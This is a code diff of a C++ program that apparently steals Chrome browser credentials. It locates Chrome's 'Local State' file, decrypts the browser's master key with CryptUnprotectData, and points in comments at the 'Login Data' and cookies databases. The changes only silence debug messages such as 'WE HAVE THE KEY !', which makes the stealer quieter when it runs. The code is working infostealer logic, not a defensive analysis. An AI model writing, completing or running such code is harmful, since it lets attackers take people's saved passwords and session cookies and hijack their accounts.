@@ -61,7 +61,7 @@ char * readFile(char * fileName){
         //return std::vector<byte> (""); //change that
     }
     std::string db_path = std::string(lpProfileDir) + std::string("\\AppData\\Local\\Google\\Chrome\\User Data\\Local State");
-    std::cout << db_path << '\n';
+    //std::cout << db_path << '\n';
     //then fetch and load json
     char * b = readFile( const_cast<char*>(db_path.c_str()));
     std::string LocalBytes = std::string(b);
@@ -97,7 +97,7 @@ PDATA_BLOB GetEncryptionKey(){
     PDATA_BLOB Ret_Blob = (PDATA_BLOB) malloc(sizeof(DATA_BLOB));
     
     if (!CryptUnprotectData(blob, NULL, NULL, NULL, NULL, 0, Ret_Blob)){
-        printf("OOF DIDNT WORK\n");
+        //printf("OOF DIDNT WORK\n");
         printf("ERROR: %d\n", GetLastError());
     }
 
@@ -115,8 +115,7 @@ json driver(){
     }
     PDATA_BLOB key = (PDATA_BLOB)malloc(sizeof(DATA_BLOB));
     key = GetEncryptionKey();
-    printf("\n");
-    printf("\nWE HAVE THE KEY !\n");
+
 
     //char * a = "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data";
     // cookies: \Users\Wyatt2\AppData\Local\Google\Chrome\User Data\Default\Network\cookies
